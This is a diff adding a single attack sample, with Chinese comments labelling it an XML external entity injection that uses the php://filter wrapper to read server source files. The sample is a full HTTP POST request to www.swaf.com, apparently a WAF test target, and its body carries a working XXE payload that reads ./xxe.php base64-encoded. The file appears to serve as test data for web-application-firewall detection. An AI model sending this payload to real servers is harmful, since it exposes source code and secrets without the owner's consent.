@@ -1,0 +1,15 @@
+# XML外部实体注入_PHP伪协议读取源码文件
+# 攻击者通过构造此语句利用php://filter伪协议可以读取服务器上存放的源代码文件
+POST /?bid=hd_tag_m8mv25iq HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25iq
+RM-PRO-Token: 35ed04997310e1c71933b3c4779db0eb
+RM-PRO-Time: 1742808471341
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version = "1.0"?>
+<!DOCTYPE ANY [
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./xxe.php" >
+]>
+<x>&xxe;</x>
